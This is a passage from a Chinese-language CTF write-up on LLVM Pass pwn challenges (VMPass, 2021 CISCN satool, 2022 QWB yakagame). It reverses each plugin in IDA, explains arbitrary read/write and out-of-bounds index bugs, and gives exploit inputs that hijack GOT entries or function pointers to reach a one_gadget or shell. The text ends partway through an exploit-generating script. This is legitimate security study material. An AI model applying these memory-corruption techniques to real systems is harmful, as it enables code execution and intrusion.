class="type">int</span> v8; <span class="comment">// [rsp+94h] [rbp-8Ch]</span></span><br><span class="line"></span><br><span class="line">  Name = (<span class="type">const</span> <span class="type">void</span> *)llvm::Value::getName(a2);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;o0o0o0o0&quot;</span> )</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(<span class="string">&quot;o0o0o0o0&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v8 = <span class="built_in">memcmp</span>(Name, <span class="string">&quot;o0o0o0o0&quot;</span>, v5);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    v4 = v8 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    sub_6AC0(a1, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果函数名是<code>o0o0o0o0</code>则会进入<code>sub_6AC0</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_6AC0</span><span class="params">(__int64 a1, llvm::Function *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5[<span class="number">0</span>] = llvm::Function::begin(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = llvm::Function::end(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::operator!=(v5, &amp;v4) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator*(v5);</span><br><span class="line">    sub_6B80(a1, v3, <span class="number">1LL</span>);</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator++(</span><br><span class="line">      v5,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其主要的逻辑又在于<code>sub_6B80</code></p><p>这个函数有点长就不完整放出来了,其内部主要在匹配<code>o0o0o0o0</code>函数的基本块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v39[<span class="number">0</span>] = llvm::BasicBlock::begin(a2);</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v38 = llvm::BasicBlock::end(a2);</span><br><span class="line">  <span class="keyword">if</span> ( (llvm::operator!=(v39, &amp;v38) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(v39);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::Instruction::getOpcode(v36) == <span class="number">55</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v35 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br></pre></td></tr></table></figure><p>遍历所有的基本块<code>BasicBlock</code>,然后使用<code>llvm::dyn_cast</code>(其功能是动态类型转换),将基本块指针转化为<code>Instruction</code>指针</p><p>如果操作码是一个call系统调用(Opcode:55),则将<code>Instruction</code>指针动态类型转化为<code>CallBase</code>指针</p><p>并进入深一步的判断,主要是匹配各个被调用的函数名字</p><p>有如下可能<code>pop push store load add min</code>,每个都对应一个处理</p><p>操作的关键有两个变量<code>off_20DFD0</code>与<code>off_20DFc0</code></p><p>其是两个指针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOAD:000000000020DFC0 88 E5 20 00 00 00 00 00       off_20DFC0 dq offset reg2            </span><br><span class="line">LOAD:000000000020DFD0 80 E5 20 00 00 00 00 00       off_20DFD0 dq offset reg1 </span><br></pre></td></tr></table></figure><p><code>add()</code>和<code>min()</code>是一对函数，会通过第一个参数确定所要操作的全局变量，然后将第二个参数的值加上或减去。</p><p>其可以用于修改寄存器的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;min&quot;</span>) &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">3</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v11 = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v11);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = llvm::ConstantInt::getZExtValue(v9);</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">      v10 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">2</span> )</span><br><span class="line">      v10 = off_20DFC0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = llvm::CallBase::getArgOperand(v35, <span class="number">1u</span>);</span><br><span class="line">    v6 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v7);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">      *v10 -= llvm::ConstantInt::getZExtValue(v6);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>store()</code>和<code>load()</code>也是一对函数，会将两个全局变量中的一个看作地址，并将地址中的值给另一个全局变量（<code>load()</code>任意地址读漏洞）或是将另一个全局变量中的值存放到这个地址中<code>store()</code>任意地址写漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;store&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">    v24 = <span class="number">0LL</span>;</span><br><span class="line">    v23 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v25);</span><br><span class="line">    <span class="keyword">if</span> ( v23 )</span><br><span class="line">    &#123;</span><br><span class="line">      v22 = llvm::ConstantInt::getZExtValue(v23);</span><br><span class="line">      <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">        v24 = off_20DFD0;</span><br><span class="line">      <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">        v24 = off_20DFC0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v24 == off_20DFD0 )</span><br><span class="line">    &#123;</span><br><span class="line">      **(_QWORD **)off_20DFD0 = *(_QWORD *)off_20DFC0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v24 == off_20DFC0 )</span><br><span class="line">    &#123;</span><br><span class="line">      **(_QWORD **)off_20DFC0 = *(_QWORD *)off_20DFD0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于<code>opt</code>一般是不会开<code>PIE</code>保护的，故这里可以考虑先利用任意地址读漏洞通过<code>opt</code>中任意一个函数的<code>got</code>表拿到<code>libc</code>地址，并用<code>add</code>和<code>min</code>函数对其修改，再利用任意地址写漏洞来劫持<code>opt</code>中的某个<code>got</code>表为<code>one_gadget</code>即可</p><p>这里选择<code>free</code>,因为每一次循环结束都会有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      <span class="built_in">free</span>(s1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator++(</span><br><span class="line">    v39,</span><br><span class="line">    <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exp:</strong></p><p><code>./opt-8 -load ./VMPass.co -VMPass ./exp.ll</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void store(<span class="built_in">int</span> a);</span><br><span class="line">void load(<span class="built_in">int</span> a);</span><br><span class="line">void add(<span class="built_in">int</span> a, <span class="built_in">int</span> b);</span><br><span class="line"> </span><br><span class="line">void o0o0o0o0()&#123;</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x77e100</span>);<span class="comment">#寄存器1变为0x77e100</span></span><br><span class="line">    load(<span class="number">1</span>);<span class="comment">#寄存器2获得0x77e100的值</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x729ec</span>);<span class="comment">#寄存器2的值增加0x77e100</span></span><br><span class="line">    store(<span class="number">1</span>);<span class="comment">#寄存器1指向的值变为寄存器2的值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><u>在打远程的时候，与内核和<code>QEMU</code>逃逸的题类似：将<code>exp.ll</code>或<code>exp.bc</code>通过<code>base64</code>加密传输到远程服务器，远程服务器会解码，并将得到的<code>LLVM IR</code>传给<code>LLVM</code>运行。</u></p><h2 id="2021ciscn-satool"><a href="#2021ciscn-satool" class="headerlink" title="2021ciscn-satool"></a>2021ciscn-satool</h2><p>题目给的文件还是老样子</p><p>直接ida打开SAPass.so,开始的start函数可以看到注册的Pass类就叫做<code>SAPass</code></p><p>根据之前说过的方法定位到重写的<code>RunOnFunction</code>函数为<code>sub_19D0</code></p><p>但这题的反编译结果要比上一题的复杂得多</p><p>虽然其中有很多是对非法信息的检测,只要我们正常编写程序都是不会触发的,所以可以忽略不计(嫌难看的话,因为这些报错代码都是连在一起的可以直接nop掉)</p><p>但就算这样代码也还是一坨,不过依据这类题目的尿性,以及自己做一些<u>调试</u>,就能判断出后面还是对<code>B4ckDo0r</code>函数内部调用的函数做判断</p><p>有如下可能<code>save takeway fakekey stealkey run</code></p><p>run中有一个特别显眼的块,调用了<code>byte_2040f8</code>指向的值作为函数指针调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    v4 = ((__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))*byte_2040f8)(</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们就看一下这个全局变量是怎么来的,是否存在操作空间</p><p>可以注意到其是在<code>save</code>函数的处理中被赋值的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sub_2430(&amp;src, v20);</span><br><span class="line">sub_2430(v67, v24);</span><br><span class="line">v25 = n;</span><br><span class="line">v26 = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">v26[<span class="number">2</span>] = byte_2040f8;</span><br><span class="line">byte_2040f8 = v26;</span><br><span class="line">v27 = (<span class="type">char</span> *)src;</span><br><span class="line"><span class="built_in">memcpy</span>(v26, src, v25);</span><br><span class="line">v28 = v26 + <span class="number">1</span>;</span><br><span class="line">v29 = (<span class="type">char</span> *)v67[<span class="number">0</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(v28, v67[<span class="number">0</span>], (<span class="type">size_t</span>)v67[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>但我们有必要知道<code>memcpy(v26, src, v25);</code>往堆块了写了什么</p><p>可以看出其来源是<code>sub_2430(&amp;src, v20);</code></p><p>这个函数大致一看就是往src里填充内容,但不太能知道<code>v20</code>是个啥,这时候可以进行一些调试,写一个<code>save(0x1,0x2,0x3,0x4.....);</code>这样的函数,然后去调试判断</p><p>在<code>stealkey</code>中有这么一句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">byte_204100 = *byte_2040f8;</span><br></pre></td></tr></table></figure><p>然后在<code>fakekey</code>中又有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v59 = byte_204100;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v58 + <span class="number">16LL</span>) == <span class="number">13</span> )</span><br><span class="line">  SExtValue = llvm::APInt::getSExtValue((llvm::APInt *)(*(_QWORD *)v58 + <span class="number">24LL</span>));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  SExtValue = <span class="number">0LL</span>;</span><br><span class="line">byte_204100 = v59 + SExtValue;</span><br><span class="line">*byte_2040f8 = v59 + SExtValue;</span><br></pre></td></tr></table></figure><p><code>SExtValue</code>是我们传递的参数</p><p>也就是说我们可以在一定范围修改<code>byte_2040f8</code>的值,那么如果上面残余了libc的指针,就能够修改为onegadget</p><p>那么就要如何确保其上残余libc地址了</p><p>第一次malloc之前</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-13_164911.png" alt=""></p><p>那么我们只需要取一次chunk,之后的fd字段就会残余地址了</p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">long</span> <span class="type">long</span> x)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">save(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">save(<span class="string">&quot;&quot;</span>, <span class="string">&quot;\n&quot;</span>);<span class="comment">//第一个参数为空字符串,是为了不将其复制到chunk中</span></span><br><span class="line">stealkey();</span><br><span class="line">fakekey(<span class="number">-0x1ecbf0</span>+<span class="number">0xe3afe</span>);</span><br><span class="line">run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2022qwb-yakagame"><a href="#2022qwb-yakagame" class="headerlink" title="2022qwb-yakagame"></a>2022qwb-yakagame</h2><p>不多说,直接打开<code>yaka.so</code>,找到注册的类名字是<code>ayaka</code></p><p>重写的ROF函数是<code>sub_C880</code></p><p>针对<code>gamestart</code>函数,然后内部又是一堆调用函数处理</p><p><code>fight</code>函数中存在一个后门</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (__int64)*score &gt; <span class="number">0x12345678</span> )</span><br><span class="line">  backdoor();</span><br></pre></td></tr></table></figure><p>不过需要当分数大于0x12345678才能调用</p><p>如何触发后门函数呢？<code>weaponlist[]</code>数组是<code>char</code>类型的，即单字节，就算比<code>boss</code>值要大，其差值也不可能大于<code>0x12345678</code>。</p><p>继续往后看，后面逆向也都不难，<code>merge</code>函数可以将一个<code>weaponlist</code>的值加到另一个上，<code>destroy</code>可以将指定<code>weaponlist</code>清零，<code>upgrade</code>可以将所有<code>weaponlist</code>的值都加上某一个数值。</p><p>接着，会有四个奇怪的函数，像是拼音，也不知道啥意思：<code>wuxiangdeyidao</code>，<code>zhanjinniuza</code>，<code>guobapenhuo</code>，<code>tiandongwanxiang</code>可以对<code>cmd</code>字符串中每个字符都进行同样的操作。由此可以想到，可通过这四个函数对<code>cmd</code>字符串原有的内容解密成某个命令。</p><p><code>cmd</code>开始是由<code>src</code>复制过来的，其中内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000011401                               ; const char src</span><br><span class="line">.rodata:0000000000011401 92                            src db 92h                              ; DATA XREF: sub_C880+6F↑o</span><br><span class="line">.rodata:0000000000011402 68                            db  68h ; h</span><br><span class="line">.rodata:0000000000011403 7B                            db  7Bh ; &#123;</span><br><span class="line">.rodata:0000000000011404 27                            db  27h ; &#x27;</span><br><span class="line">.rodata:0000000000011405 6D                            db  6Dh ; m</span><br><span class="line">.rodata:0000000000011406 93                            db  93h</span><br><span class="line">.rodata:0000000000011407 68                            db  68h ; h</span><br><span class="line">.rodata:0000000000011408 66                            db  66h ; f</span><br><span class="line">.rodata:0000000000011409 00                            db    0</span><br></pre></td></tr></table></figure><p>可以看到其中第二个和第七个字符一样，而那四个函数每次又是对所有字符做同样的操作，因此不难联想到最后解密成的命令很可能是<code>cat flag</code>，写个脚本爆破一下即可。不过这题实际上也不用如此，继续对后面进行分析就知道了。</p><p>后面就是一个<code>else</code>条件分支，也就是说当调用的函数不是上面提及的所有函数的时候，就会进入这个分支。这里用了<code>C++ STL</code>里的<code>map</code>，<code>map</code>可在任意类型的值之间建立映射关系，并且会按关键字从小到大排序。如：<code>map[&quot;abc&quot;] = 123</code>就将<code>abc</code>这个字符串与<code>123</code>这个数值间建立了映射关系，并且在通过迭代器遍历<code>map</code>的时候，关键字<code>abc</code>会在关键字<code>abd</code>之前遍历到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="built_in">std</span>::operator==&lt;<span class="type">char</span>&gt;(v22, v58) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v23 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(</span><br><span class="line">          &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</span><br><span class="line">          <span class="string">&quot;you really want this?all right,i will add it into the weapon list&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v23, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v24 = <span class="built_in">std</span>::_Rb_tree_iterator&lt;<span class="built_in">std</span>::<span class="built_in">pair</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span> <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::operator-&gt;(&amp;v34);</span><br><span class="line">  weaponlist[v33] = *(_BYTE *)(v24 + <span class="number">32</span>);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">++v33;</span><br></pre></td></tr></table></figure><p>在这个<code>else</code>分支中，会先遍历<code>map</code>，查找是否有调用的这个函数名作为<code>key</code>，其第一个参数作为<code>value</code>的映射关系。</p><p>若是有，则会将<code>weaponlist[]</code>数组下标对应<code>map</code>中此映射关系位置的值改为这个<code>value</code>。<strong>若没有，则会将这个新映射关系加入<code>map</code>中。</strong></p><p>我们注意到，此处的<code>v33</code>是有符号的<code>char</code>类型，其范围是<code>-128~127</code>，<u>故当<code>map</code>中映射关系很多的时候，<code>v33</code>会是负数，此处也就存在一个数组下标越界的漏洞了。</u></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000002169A8                               public cmd</span><br><span class="line">.bss:00000000002169A8                               ; char *cmd</span><br><span class="line">.bss:00000000002169A8 ?? ?? ?? ?? ?? ?? ?? ??       cmd dq ?                                ; DATA XREF: LOAD:0000000000002468↑o</span><br><span class="line">.bss:00000000002169A8                                                                       ; .got:cmd_ptr↑o</span><br><span class="line">.bss:00000000002169B0                               public score</span><br><span class="line">.bss:00000000002169B0 ??                            score db    ? ;                         ; DATA XREF: LOAD:0000000000001340↑o</span><br><span class="line">.bss:00000000002169B0                                                                       ; .got:score_ptr↑o</span><br><span class="line">.bss:00000000002169B1 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B2 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B3 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B4 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B5 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B6 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B7 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B8 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169B9 ??                            db    ? ;</span><br><span class="line">.bss:00000000002169BA ??                            db    ? ;</span><br><span class="line">.bss:00000000002169BB ??                            db    ? ;</span><br><span class="line">.bss:00000000002169BC ??                            db    ? ;</span><br><span class="line">.bss:00000000002169BD ??                            db    ? ;</span><br><span class="line">.bss:00000000002169BE ??                            db    ? ;</span><br><span class="line">.bss:00000000002169BF ??                            db    ? ;</span><br><span class="line">.bss:00000000002169C0                               public weaponlist</span><br><span class="line">.bss:00000000002169C0                               ; char weaponlist[256]</span><br><span class="line">.bss:00000000002169C0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+weaponlist db 100h dup(?) </span><br></pre></td></tr></table></figure><p>如上图，可以看到<code>cmd</code>指针和<code>score</code>指针都在<code>weaponlist</code>之前，故可以通过这个数组下标越界漏洞，修改<code>score</code>指针的最后一字节[-16]，使其错位，从而指向很大的数字，触发后门函数。</p><p>由于<code>opt</code>没开<code>PIE</code>保护，故直接将<code>cmd</code>指针指向<code>opt</code>中的某个字符串末尾的<code>sh</code>即可</p><p>一个生成exp模板的脚本,对生成的文件进行微调即可完成要求</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">s = <span class="built_in">str</span>(i)</span><br><span class="line">s = <span class="string">&quot;0&quot;</span>*(<span class="number">3</span>-<span class="built_in">len</span>(s)) + s</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;void func&quot;</span> + s + <span class="string">&quot;(int x);&quot;</span>)</span><br><span class="line"></span><br><span 